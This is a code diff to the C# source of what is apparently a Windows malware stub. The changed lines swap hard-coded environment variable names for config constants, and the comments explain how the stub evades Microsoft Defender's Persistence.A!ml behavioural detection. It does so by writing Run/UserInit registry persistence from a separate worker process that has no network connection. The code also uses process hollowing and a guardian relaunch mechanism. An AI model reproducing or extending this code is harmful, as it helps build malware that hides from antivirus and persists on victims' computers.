@@ -211,10 +211,10 @@ partial class Program
         // process has NO network connection. Defender's Persistence.A!ml triggers when the
         // same process writes to Run/UserInit AND makes a network connection — isolating
         // persistence here breaks that behavioral correlation entirely.
-        if (Environment.GetEnvironmentVariable("SERO_PERSIST_WORKER") == "1")
+        if (Environment.GetEnvironmentVariable(Config.EnvKeyPersistWorker) == "1")
         {
             StubLog.Info("[Worker] started");
-            Environment.SetEnvironmentVariable("SERO_PERSIST_WORKER", null);
+            Environment.SetEnvironmentVariable(Config.EnvKeyPersistWorker, null);
             await Task.Delay(800);
             bool isAdm = IsAdmin();
             if (Config.PersistRegistry)        Persistence.InstallRegistry(Config.PersistName);
@@ -263,7 +263,7 @@ partial class Program
         // uninstall, exit so the mutex does not get re-acquired.
         // SERO_RELAUNCH is set only by guardian-initiated relaunches — direct user runs
         // do not have it, so they are never blocked by the stop flag.
-        bool isGuardianRelaunch = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("SERO_RELAUNCH"));
+        bool isGuardianRelaunch = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable(Config.EnvKeyRelaunch));
         if (isGuardianRelaunch && Protection.IsRecentStopFlag()) { Breadcrumb("EXIT: recent stop flag (guardian)"); return; }
 
         // Single instance (if mutex is enabled)
@@ -345,9 +345,9 @@ partial class Program
                 {
                     ProcessHollowing.SpawnDetached(persistExe, new Dictionary<string, string?>
                     {
-                        ["SERO_PERSIST_WORKER"]            = "1",
+                        [Config.EnvKeyPersistWorker]       = "1",
                         [ProcessHollowing.HOLLOW_ENV_KEY]  = null,
-                        ["SERO_GUARDIAN"]                  = null,
+                        [Config.EnvKeyGuardian]            = null,
                     });
                 }
 
@@ -362,7 +362,7 @@ partial class Program
         {
             var realPath = Environment.ProcessPath;
             if (!string.IsNullOrEmpty(realPath))
-                Environment.SetEnvironmentVariable("SERO_EXE", realPath);
+                Environment.SetEnvironmentVariable(Config.EnvKeyExe, realPath);
         }
 
         // Process hollowing: if enabled and we're NOT the hollowed instance, hollow and exit
